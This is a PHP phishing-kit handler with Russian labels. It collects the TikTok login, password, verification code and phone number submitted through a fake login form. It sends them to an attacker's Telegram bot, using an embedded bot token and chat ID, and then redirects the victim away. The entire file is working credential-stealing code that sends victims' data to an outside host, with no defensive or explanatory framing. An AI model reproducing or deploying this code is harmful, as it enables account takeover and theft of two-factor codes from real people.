<?php
$Login = $_POST['login'];
$Pass = $_POST['pass'];
$Code = $_POST['code'];
$Number = $_POST['number'];
$token = '6536923835:AAGPJRgAaY014557atNCuirP6IEHP4NWVV4';
$chat_id = '1076426533'; //Айди чата
$bb = $_POST[""];
$arr = array(
  ' 🔥 [TikTok - Новый лог] ' => $bb,
  '' => $bb,
  '🔥 Логин : ' => $Login,
  '🔥 Пароль : ' => $Pass,
  '🔥 Код : ' => $Code,
  '🔥 Номер : ' => $Number,
);
 
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};
 
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
 
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0; url=/" />
</head>
<body>
</body>
</html>